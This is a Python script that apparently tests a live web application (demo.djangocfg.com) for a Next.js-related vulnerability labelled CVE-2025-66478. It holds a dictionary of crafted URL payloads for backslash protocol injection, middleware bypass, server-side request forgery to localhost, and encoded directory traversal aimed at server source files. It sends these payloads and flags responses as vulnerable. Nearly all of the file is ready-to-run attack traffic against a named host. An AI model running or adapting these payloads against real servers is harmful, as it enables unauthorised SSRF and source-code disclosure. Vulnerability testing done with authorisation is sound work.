#!/usr/bin/env python3
import requests
import json
import sys
import time

# === YOUR TARGET ===
TARGET = "https://demo.djangocfg.com"

# === LOCAL SSRF-CHECK TARGET ===
# You control this domain, so SSRF to your own host is safe.
SELF_SSRF_TEST = "https://demo.djangocfg.com/ping"

# --- Test payloads that can lead to REAL exploitation ---
tests = {
    # Backslash protocol injection
    "proto_inject_1": "/%5Chttp://127.0.0.1:3000",
    "proto_inject_2": "/%5C%5Clocalhost:3000",

    # Middleware bypass leading to SSRF surface
    "middleware_bypass_1": "/_next/%5Chttp://127.0.0.1:3000",
    "middleware_bypass_2": "/.well-known/%5Chttp://localhost:3000",

    # Attempt to trigger server-side fetch() through escape
    "server_fetch_trigger_1": "/api/fetch/%5Chttps://example.com",
    "server_fetch_trigger_2": "/api/fetch/%5C/" + SELF_SSRF_TEST,

    # Double slash protocol confusion
    "double_slash_proto_1": "//http://localhost:3000",
    "double_slash_proto_2": "//https://example.com",

    # Directory traversal through _next/data
    "lfi_candidate_1": "/_next/data/dev/app/%2E%2E/%2E%2E/server/app/page.js",
    "lfi_candidate_2": "/_next/static/%2E%2E/%2E%2E/server/app/layout.js",

    # Rare CVE bypass variants
    "rare_escape_chain_1": "/%5C/%5C/http://127.0.0.1:3000",
    "rare_escape_chain_2": "/api/%5C%5Chttps:/%5Cexample.com",
}

def send(path):
    url = TARGET + path
    try:
        r = requests.get(
            url,
            timeout=8,
            allow_redirects=False,
            headers={"User-Agent": "CVE-2025-66478-Tester"}
        )
        body = r.text[:400].replace("\n", "")
        return {
            "status": r.status_code,
            "location": r.headers.get("location"),
            "body_snippet": body
        }
    except Exception as e:
        return {"error": str(e)}

def highlight(res):
    """Detect real exploit signs."""
    if not isinstance(res, dict):
        return "OK"

    txt = json.dumps(res)

    danger = [
        "ECONNREFUSED",           # real SSRF trigger
        "127.0.0.1",              # internal reference
        "localhost",              # internal target
        ".next/server",           # file leak
        "fetch(",                 # server action activated
        "Invalid URL",            # protocol reparse
        "http:/localhost",        # backslash proto
    ]

    for d in danger:
        if d in txt:
            return "🔥 VULNERABLE → " + d

    return "OK"

# ---- RUN ----
print("🔍 REAL EXPLOITABILITY TEST for CVE-2025-66478")
print(f"Target: {TARGET}\n")

full_results = {}

for name, path in tests.items():
    print(f"▶️ {name}: {path}")
    result = send(path)
    full_results[name] = result

    print(json.dumps(result, indent=2))
    print("Result:", highlight(result))
    print("-" * 70)

print("\n🏁 Done. Summary:\n")
for name, data in full_results.items():
    print(f"{name:30} → {highlight(data)}")
